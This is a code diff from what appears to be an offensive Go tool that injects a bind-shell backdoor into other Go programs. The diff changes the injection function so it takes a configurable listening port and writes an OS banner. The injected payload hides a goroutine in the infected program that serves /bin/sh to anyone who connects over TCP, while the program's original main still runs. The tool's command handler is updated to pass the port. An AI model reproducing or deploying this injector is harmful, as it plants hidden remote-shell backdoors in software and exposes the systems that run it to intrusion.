@@ -223,7 +223,7 @@ func BindShellLoadTargets(targets *[]Target, targets_file string) {
 	}
 }
 
-func BindShellInject(file_path string, OS string, Arch string) {
+func BindShellInject(file_path string, OS string, Arch string, port int) {
 	// Открытие оригинального файла
 	original_file, err := os.OpenFile(file_path, os.O_RDWR|os.O_APPEND, 0644)
 	if err != nil {
@@ -303,7 +303,7 @@ func BindShellInject(file_path string, OS string, Arch string) {
 	}
 
 	// Строка с инъекцией
-	BS_string := "\n\nfunc bs_handle(BS_conn net.Conn) {\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_listener, _ := net.Listen(\"tcp\", \":13337\")\n\tfor {\n\t\tBS_conn, _ := BS_listener.Accept()\n\t\tgo bs_handle(BS_conn)\n\t}\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}"
+	BS_string := fmt.Sprintf("\n\nfunc bs_handle(BS_conn net.Conn) {\n\tBS_conn.Write([]byte(\"%s\"))\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_listener, _ := net.Listen(\"tcp\", \":%d\")\n\tfor {\n\t\tBS_conn, _ := BS_listener.Accept()\n\t\tgo bs_handle(BS_conn)\n\t}\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}", OS, port)
 
 	// Добавление инъекции в файл
 	if _, err := new_file.WriteString(BS_string); err != nil {
@@ -416,7 +416,10 @@ func BindShellRequest(request []string, targets *[]Target) {
 	case "help":
 		BindShellHelp()
 	case "inject":
-		BindShellInject(request[2], request[3], request[4])
+		ok, value := checkPositiveNumber(request[5])
+		if ok {
+			BindShellInject(request[2], request[3], request[4], value)
+		}
 	case "off":
 		// Если аргументов более трех, остановка
 		if len(request) > 4 {
@@ -528,6 +531,8 @@ func BindShellRequest(request []string, targets *[]Target) {
 		if ok {
 			BindShellTimeout(value)
 		}
+	default:
+		fmt.Println("[BindShell] Incorrect shell command!")
 	}
 }
 
